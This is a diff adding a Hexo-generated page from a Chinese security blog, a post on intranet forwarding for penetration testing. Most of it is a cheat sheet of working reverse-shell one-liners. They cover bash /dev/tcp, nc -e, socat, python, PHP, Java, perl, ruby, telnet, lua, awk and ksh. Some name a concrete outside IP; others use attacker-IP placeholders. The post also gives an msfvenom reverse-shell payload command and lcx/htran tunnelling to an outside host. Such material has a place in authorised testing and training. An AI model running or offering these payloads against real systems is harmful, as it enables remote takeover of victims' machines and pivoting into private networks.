@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#33363b">
+    <meta name="msapplication-TileColor" content="#33363b">
+    
+    
+    
+    
+    <meta name="keywords" content="Life, ARIA, Hexo">
+    
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="192x192" href="/favicons/android-chrome-192x192.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png">
+    
+    
+    <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#33363b">
+    
+    
+    <link rel="manifest" href="/favicons/site.webmanifest">
+    
+    
+    <meta name="msapplication-config" content="/favicons/browserconfig.xml">
+    
+    
+    <link rel="alternate" href="/atom.xml" title="TuringGu" type="application/atom+xml">
+    
+    
+    <link rel="shortcut icon" type="image/x-icon" href="/favicons/favicon.ico">
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/css/index.css">
+    
+    <link rel="stylesheet" type="text/css" href="/css/sidebar.css">
+    
+    
+<link rel="stylesheet" type="text/css" href="/css/page.css">
+<link rel="stylesheet" type="text/css" href="/css/post.css">
+
+    <link rel="stylesheet" type="text/css" href="/css/custom.css">
+    <link rel="stylesheet" type="text/css" href="/css/atom-one-dark.css">
+    <link rel="stylesheet" type="text/css" href="/css/lightgallery.min.css">
+    <script type="text/javascript" src="/js/jquery.min.js"></script>
+    <script defer type="text/javascript" src="/js/util.js"></script>
+    <script defer type="text/javascript" src="/js/scrollspy.js"></script>
+    <script defer type="text/javascript" src="/js/fontawesome-all.min.js"></script>
+    <script defer type="text/javascript" src="/js/lightgallery.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-fullscreen.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-hash.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-pager.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-thumbnail.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-zoom.min.js"></script>
+    
+    <script defer src="/js/busuanzi.pure.mini.js"></script>
+    
+    
+    <script defer type="text/javascript" src="/js/search.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var searchPath = "search.xml";
+      if (searchPath.length === 0) {
+        searchPath = "search.xml";
+      }
+      var path = "/" + searchPath;
+      searchFunc(path, "search-input", "search-result");
+    });
+    </script>
+    
+    
+    <script defer type="text/javascript" src="/js/index.js"></script>
+    
+    <script defer type="text/javascript" src="/js/custom.js"></script>
+    <title>内网转发 | TuringGu - Info Security</title>
+  </head>
+  <body itemscope="" itemtype="http://schema.org/WebPage" lang="zh_CN" data-spy="scroll" data-target=".list-group">
+    
+<header id="header" class="header" style="background: #33363b;">
+  <div class="container">
+    <div class="header-container">
+      <div class="header-title">
+        <h1 class="title"><a href="/">TuringGu</a></h1>
+        <h2 class="subtitle">Info Security</h2>
+      </div>
+      
+      <div class="logo">
+        <img src="/images/logo.png" alt="logo">
+      </div>
+      
+    </div>
+    <nav id="nav" class="nav">
+      <a id="nav-toggle" class="nav-toggle" aria-hidden="true"><i class="fas fa-bars" aria-label="切换导航栏"></i></a>
+      <ul id="menu" role="menubar" aria-hidden="false">
+        
+        <li role="menuitem"><a href="/">首页</a></li>
+        
+        <li role="menuitem"><a href="/archives/">归档</a></li>
+        
+        <li role="menuitem"><a href="/categories/">分类</a></li>
+        
+        <li role="menuitem"><a href="/tags/">标签</a></li>
+        
+        <li role="menuitem"><a href="/about/">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <main id="main" class="main">
+      <div class="container">
+        <div class="main-container">
+          <div class="content">
+            
+<div id="post" class="page">
+  
+  <article class="article post card animate" itemscope="" itemtype="http://schema.org/Article">
+    <div class="post-block">
+      <link itemprop="mainEntityOfPage" href="https://TuringGu.github.io/2019/02/26/Intranet-forwarding/">
+      <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+       <meta itemprop="name" content="TuringGu">
+       <meta itemprop="description" content="">
+       <meta itemprop="image" content="/images/myavatar.jpg">
+      </span>
+      <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+       <meta itemprop="name" content="TuringGu">
+      </span>
+    </div>
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">内网转发</h1>
+      <div class="post-meta">
+        
+        <span class="post-date">
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2019-02-26T13:58:01+08:00">2019-02-26 13:58:01</time></span>
+        </span>
+        
+        
+        
+      </div>
+    </header>
+    <main class="post-main" itemprop="articleBody">
+      <h2 id="内网转发目的"><a href="#内网转发目的" class="headerlink" title="内网转发目的"></a>内网转发目的</h2><p>渗透测试中，我们往往会面对十分复杂的内网环境。比如最常用的防火墙，它会限制特定端口的让A和C数据包出入<br>最典型的解释是：<br>A可以访问B的80端口，但不能访问B的3389端口<br>A可以访问B，B可以访问C，但A不能访问C。需要通过B转发数据，让A和C进行通信</p>
+<p><img src="/images/Intranet_eg01.jpg" alt="内网示意图"></p>
+<hr>
+<h2 id="知识基础"><a href="#知识基础" class="headerlink" title="知识基础"></a>知识基础</h2><h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>代理通常是指正向代理。正向代理的过程，隐藏了真实的请求客户端，服务端不知道真实客户端身份，哭护短请求的服务都被代理服务器代替来请求</p>
+<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>反向代理是相对于服务器而言。例如：当请求<code>www.baidu.com</code>时，背后可能有成千上万台服务器为我们服务，但具体是哪一台则不得而知。此时<code>www.baidu.com</code>就是反向代理服务器，反向代理服务器会帮我们将请求转发到真实的服务器。比如<code>负载均衡</code></p>
+<hr>
+<h2 id="内网转发三种形式"><a href="#内网转发三种形式" class="headerlink" title="内网转发三种形式"></a>内网转发三种形式</h2><h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><ul>
+<li>Windows反弹Shell：<code>nc</code></li>
+<li>Linux反弹Shell：<code>nc</code></li>
+</ul>
+<p>shell: <code>ksh</code>  <code>socat</code><br>udp接收：<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat udp-listen:5555 -<br></code></pre></td></tr></table></figure></p>
+<hr>
+<h4 id="Msfvenom生成"><a href="#Msfvenom生成" class="headerlink" title="Msfvenom生成"></a>Msfvenom生成</h4><p>msfvenom生成任意类型反弹shell代码<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -l payloads | grep windows<br>msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.20.92 LPORT=5555<br></code></pre></td></tr></table></figure></p>
+<hr>
+<h4 id="Linux常用反弹shell代码"><a href="#Linux常用反弹shell代码" class="headerlink" title="Linux常用反弹shell代码"></a>Linux常用反弹shell代码</h4><ol>
+<li><p>发送文件(公网发内网)<br>文件发送端：<code>nc -lp 6666 &lt; 文件</code><br>文件接收端：<code>nc 发送端ip 发送端端口 &gt; 新文件</code></p>
+</li>
+<li><p>发送文件(内网发公网)<br>文件发送端：<code>nc -lp 6666 &gt; 文件</code><br>文件接收端：<code>nc 发送端ip 发送端端口 &lt; 新文件</code></p>
+</li>
+<li><p>聊天<br>发送端：<code>nc -lp 6666</code><br>接收端：<code>nc 发送端ip 发送端端口</code></p>
+</li>
+<li><p>发送shell<br>发送端(公网服务器)：<code>nc -lvvp 6666 -e /bin/bash</code><br>接收端：<code>nc 发送端ip 发送端攻击者ip</code></p>
+</li>
+<li><p>反弹shell<br>发送端(内网网服务器)：<code>nc 接收端ip 接收端端口 -e /bin/bash</code></p>
+</li>
+<li><p>bash反弹<br>发送端(受害者)：<code>bash -i &gt;&amp; /dev/tcp/111.230.170.95/9985 0&gt;&amp;1</code><br>发送端(受害者)：<code>0&lt;&amp;31-;exec 31&lt;&gt;/dev/tcp/111.230.170.95/9985;sh &lt;&amp;31 &gt;&amp;31 2&gt;&amp;31</code></p>
+</li>
+<li><p>socat反弹(tcp)</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./socat <span class="hljs-built_in">exec</span>:<span class="hljs-string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:攻击机ip:攻击机端口<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>socat反弹(udp)</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat udp-connect:攻击者ip:端口 <span class="hljs-built_in">exec</span>:<span class="hljs-string">'bash -li'</span>,pty,stderr,sane 2&gt;&amp;1&gt;/dev/null &amp;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>python反弹</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("接收端ip",接收端端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>PHP反弹</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">'$sock=fsockopen("攻击者ip",端口);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>JAVA反弹</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">r = Runtime.getRuntime()<br>p = r.exec([<span class="hljs-string">"/bin/bash"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"exec 5&lt;&gt;/dev/tcp/攻击者ip/端口;cat &lt;&amp;5 | while read line; do <span class="hljs-variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])<br>p.waitFor()<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>perl反弹</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl -e <span class="hljs-string">'use Socket;$i="攻击者ip";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>ruby反弹</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby -rsocket -e <span class="hljs-string">'exit if fork;c=TCPSocket.new("攻击者ip","端口");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>telnet反弹</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mknod backpipe p &amp;&amp; telnet 攻击者ip 端口 0&lt;backpipe | /bin/bash 1&gt;backpipe<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>lua反弹(安装lua环境：<code>apt-get install lua*</code>)</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lua -e <span class="hljs-string">"local s=require('socket');local t=assert(s.tcp());t:connect('攻击者ip',端口);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>awk反弹</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">awk <span class="hljs-string">'BEGIN&#123;s="/inet/tcp/0/攻击者ip/端口";while(1)&#123;do&#123;s|&amp;getline c;if(c)&#123;while((c|&amp;getline)&gt;0)print $0|&amp;s;close(c)&#125;&#125;while(c!="exit");close(s)&#125;&#125;'</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>ksh反弹</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ksh -c <span class="hljs-string">'ksh &gt;/dev/tcp/攻击者ip/端口 2&gt;&amp;1 &lt;&amp;1'</span><br></code></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>Tip：注意接收端空换行可能导致断开连接</p>
+<hr>
+<h3 id="反弹端口"><a href="#反弹端口" class="headerlink" title="反弹端口"></a>反弹端口</h3><ul>
+<li><code>LCX</code></li>
+<li><code>reduh</code><blockquote>
+<p>Mstsc客户端 =&gt; reDuh代理 =&gt; HTTP tunne =&gt; Web服务器 =&gt; 3389</p>
+</blockquote>
+</li>
+</ul>
+<p>Lcx<br>监听5555端口，转发至12345端口<br>./lcx -listen 5555 12345<br>转发本机80端口，至外网111.230.170.95 的 5555端口<br>./lcx -slave 111.230.170.95 5555 127.0.0.1 80</p>
+<hr>
+<h4 id="实验1"><a href="#实验1" class="headerlink" title="实验1"></a>实验1</h4><p><img src="/images/Intranet_eg02.jpg" alt="参考示例内网环境"></p>
+<p>环境：<br>172.16.39.141(A)不能访问192.18.20.x网段，但可以访问172.16.39.x的内网机器（B），同时80端口只能本地访问，但是8080端口对外开放<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 被控制服务器A的80端口转发到本地8080端口</span><br>lcx -tran 8080 127.0.0.1 80<br><br><span class="hljs-comment"># 使用双网卡的边界主机B，与内网主机A的8080端口建立连接</span><br><span class="hljs-comment"># A：172.16.39.207</span><br><span class="hljs-comment"># B：172.16.39.141</span><br>lcx -slave 172.16.39.207 4444 172.16.39.141 8080<br><br><span class="hljs-comment"># 在边界主机B上监听端口4444，并将监听到的内容发送到12345</span><br>lcx -listen 4444 12345<br><br><span class="hljs-comment"># 外网机器访问边界主机B的外网地址的12345端口</span><br>curl http://192.168.20.198:12345<br></code></pre></td></tr></table></figure></p>
+<hr>
+<h3 id="反弹代理"><a href="#反弹代理" class="headerlink" title="反弹代理"></a>反弹代理</h3><p>有时需要对内网进行更深一步的扫描和渗透，此时需要设置一个代理服务器，充当外网和内网数据转发的节点，即反弹代理，也称为反弹socket</p>
+<h4 id="利用系统服务"><a href="#利用系统服务" class="headerlink" title="利用系统服务"></a>利用系统服务</h4><ul>
+<li><p><code>http tunnel</code></p>
+<blockquote>
+<p>reduh tunna 用来反弹端口<br>reGeorg反弹代理</p>
+</blockquote>
+</li>
+<li><p><code>ssh tunnel</code></p>
+</li>
+<li><p><code>ftp tunnel</code></p>
+<blockquote>
+<p>frp</p>
+</blockquote>
+</li>
+<li><p><code>DNS tunnel</code></p>
+</li>
+<li><code>Ping tunnel</code></li>
+</ul>
+<hr>
+<h4 id="代理软件"><a href="#代理软件" class="headerlink" title="代理软件"></a>代理软件</h4><p>proxifier简单设置</p>
+<ul>
+<li><p>配置文件-&gt;代理服务器<br>地址：<code>127.0.0.1:8888</code><br>协议：<code>SOCKES 5</code></p>
+</li>
+<li><p>代理规则<br>添加应用程序，设置目标机<code>任意</code>，目标端口<code>任意</code>，动作<code>Proxy SOCKS5 127.0.0.1</code></p>
+</li>
+</ul>
+<hr>
+<p>Kali代理<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/proxychains<br>socks5 127.0.0.1 8888<br>proxychains nmap -Pn -p 80 x.x.x.x<br></code></pre></td></tr></table></figure></p>
+<p>proxychains</p>
+<h4 id="htran"><a href="#htran" class="headerlink" title="htran"></a>htran</h4><ol>
+<li><p>外网服务器执行</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 监听两个端口，9001用来接收内网机器，9000连接proxychians等socket5工具的数据</span><br>HTran.exe -p -listen 9001 9000<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>内网机器执行</p>
+<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined">Htran.exe -p -slave 1.1.1.1 9001 127.0.0.1 8009<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>配置本机socket5工具，连接外网服务器上的9000端口<br>推荐<code>Earthworm</code></p>
+</li>
+</ol>
+<hr>
+<h2 id="内网转发多种情况"><a href="#内网转发多种情况" class="headerlink" title="内网转发多种情况"></a>内网转发多种情况</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 本地转发</span><br><span class="hljs-comment"># 使用本地的8888转发172.16.39.141:80的内容</span><br>ssh -CfNg -L 8888:127.0.0.1:80 root@172.16.39.141<br><br><span class="hljs-comment"># 远程转发</span><br><span class="hljs-comment"># 使用172.16.39.141的8888转发本地的80的内容</span><br><span class="hljs-comment"># 只允许172.16.39.141访问172.16.39.141的8888</span><br>ssh -CfNg -R 8888:127.0.0.1:80 root@172.16.39.141<br></code></pre></td></tr></table></figure>
+<hr>
+<h3 id="常见端口转发工具"><a href="#常见端口转发工具" class="headerlink" title="常见端口转发工具"></a>常见端口转发工具</h3><ul>
+<li>portmap</li>
+<li>花生壳<br>等等</li>
+</ul>
+<hr>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="FTP常用命令"><a href="#FTP常用命令" class="headerlink" title="FTP常用命令"></a>FTP常用命令</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">service vsftpd status  <span class="hljs-comment"># 服务状态</span><br>ftp 172.16.12.2  <span class="hljs-comment"># ftp连接</span><br>get shell.txt  <span class="hljs-comment"># 下载</span><br>put shell.txt  <span class="hljs-comment"># 上传</span><br><span class="hljs-built_in">bye</span>  <span class="hljs-comment"># 退出</span><br></code></pre></td></tr></table></figure>
+<h3 id="FTP匿名登录Server-U"><a href="#FTP匿名登录Server-U" class="headerlink" title="FTP匿名登录Server-U"></a>FTP匿名登录Server-U</h3><p>默认账号密码：<br>账号：<code>anonymous</code><br>密码：空或<code>Email</code></p>
+
+    </main>
+    <footer class="post-footer">
+      
+      <div class="post-tags">
+        
+        <a class="post-tag button" href="/tags/Intranet/" rel="tag"><i class="fas fa-tags"></i>Intranet</a>
+        
+        <a class="post-tag button" href="/tags/Forwading/" rel="tag"><i class="fas fa-tags"></i>Forwading</a>
+        
+      </div>
+      
+    </footer>
+  </article>
+  
+  
+<div class="reward" id="reward">
+  <p>您的支持是我前进的动力！</p>
+  <button id="reward-button" class="button" disable="enable">打赏</button>
+  <div id="qr" class="qr" style="display: none;" aria-hidden="true">
+    
+    
+    
+  </div>
+</div>
+
+
+  
+  
+  <nav class="page-nav">
+    <div class="page-nav-next page-nav-item">
+      
+      <a href="/2019/02/20/Privilege-persistence/" rel="next" title="权限维持"><i class="fas fa-angle-left"></i><span class="nav-title">权限维持</span></a>
+      
+    </div>
+    <div class="page-nav-prev page-nav-item">
+      
+      <a href="/2019/03/01/File-transfer/" rel="prev" title="文件传输"><span class="nav-title">文件传输</span><i class="fas fa-angle-right"></i></a>
+      
+    </div>
+  </nav>
+  
+  
+</div>
+
+          </div>
+          
+          
+          
+<aside class="sidebar" id="sidebar" style="background: url(/images/background.png);">
+  
+  <div class="search">
+    <div class="form-group">
+      <i class="fas fa-search"></i><input type="search" id="search-input" name="q" results="0" placeholder="搜索" class="form-control">
+    </div>
+  </div>
+  <div class="search-result-box" id="search-result"></div>
+  
+  
+<div class="info sidebar-item" id="info">
+  
+  <img class="author-avatar" src="/images/myavatar.jpg" alt="TuringGu">
+  
+  <h1 class="author-name">TuringGu</h1>
+  <h2 class="author-description"></h2>
+  <div class="site-count">
+    
+    <div class="archives-count">
+      <div class="site-count-title">归档</div>
+      <div><a href="/archives/">38</a></div>
+    </div>
+    
+    
+    
+    <span class="site-count-divider divider">|</span>
+    
+    <div class="categories-count">
+      <div class="site-count-title">分类</div>
+      <div><a href="/categories/">0</a></div>
+    </div>
+    
+    
+    
+    <span class="site-count-divider divider">|</span>
+    
+    <div class="tags-count">
+      <div class="site-count-title">标签</div>
+      <div><a href="/tags/">73</a></div>
+    </div>
+    
+  </div>
+  
+  <div class="rss">
+    <a class="rss-link button sidebar-item" href="/atom.xml"><i class="fas fa-rss"></i>RSS</a>
+  </div>
+  
+</div>
+
+
+  <div class="sidebar-sticky">
+    
+    
+    
+    
+    
+    <hr>
+    <div class="post-toc sidebar-item" id="toc-div">
+      <div><i class="fas fa-list-ol"></i>文章目录</div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#内网转发目的"><span class="toc-text">内网转发目的</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#知识基础"><span class="toc-text">知识基础</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#正向代理"><span class="toc-text">正向代理</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#反向代理"><span class="toc-text">反向代理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#内网转发三种形式"><span class="toc-text">内网转发三种形式</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#反弹Shell"><span class="toc-text">反弹Shell</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#Msfvenom生成"><span class="toc-text">Msfvenom生成</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#Linux常用反弹shell代码"><span class="toc-text">Linux常用反弹shell代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#反弹端口"><span class="toc-text">反弹端口</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#实验1"><span class="toc-text">实验1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#反弹代理"><span class="toc-text">反弹代理</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#利用系统服务"><span class="toc-text">利用系统服务</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#代理软件"><span class="toc-text">代理软件</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#htran"><span class="toc-text">htran</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#内网转发多种情况"><span class="toc-text">内网转发多种情况</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#常见端口转发工具"><span class="toc-text">常见端口转发工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#补充"><span class="toc-text">补充</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#FTP常用命令"><span class="toc-text">FTP常用命令</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#FTP匿名登录Server-U"><span class="toc-text">FTP匿名登录Server-U</span></a></li></ol></li></ol></div>
+    </div>
+    
+    
+    
+    
+    <hr>
+    <div class="blogroll sidebar-item">
+      <div><i class="fas fa-link"></i>友情链接</div>
+      <ul>
+        
+        <li><i class="fas fa-link"></i><a href="https://github.com/TuringGu" target="_blank">GitHub</a></li>
+        
+      </ul>
+    </div>
+    
+  </div>
+</aside>
+
+
+          
+        </div>
+      </div>
+    </main>
+    
+<footer id="footer" class="footer" style="background: #33363b;">
+  <div class="container">
+    <div class="back-to-top">
+      <button id="back-to-top"><i class="fas fa-angle-double-up" aria-label="回到顶部"></i></button>
+    </div>
+    <div class="footer-container">
+      <div class="footer-left">
+        <div class="copyright">
+          <span class="author">TuringGu</span><span class="year"><i class="far fa-copyright"></i>2018 - 2019</span><span class="creative-commons"><i class="fab fa-creative-commons"></i><a href="http://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">BY-NC-ND 4.0</a></span>
+        </div>
+        
+        <div class="busuanzi">
+          <span id="busuanzi_container_site_pv"><i class="fas fa-eye" aria-label="站点点击量" aria-hidden="false"></i><span id="busuanzi_value_site_pv"></span></span><span id="busuanzi_container_site_uv"><i class="fas fa-user" aria-label="站点用户数" aria-hidden="false"></i><span id="busuanzi_value_site_uv"></span></span><span id="busuanzi_container_page_pv"><i class="far fa-file-alt"></i><span id="busuanzi_value_page_pv" aria-label="页面点击量" aria-hidden="false"></span></span>
+        </div>
+        
+      </div>
+      <div class="footer-right">
+        <div class="custom-info">
+          
+          托管于<i class="fab fa-github-alt"></i><a href="https://pages.github.com/" target="_blank">GitHub Pages</a>
+          
+        </div>
+        <div class="powered-by">
+          由 <a href="https://hexo.io/" target="_blank">Hexo</a> 强力驱动 | 主题 <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  </body>
+</html>
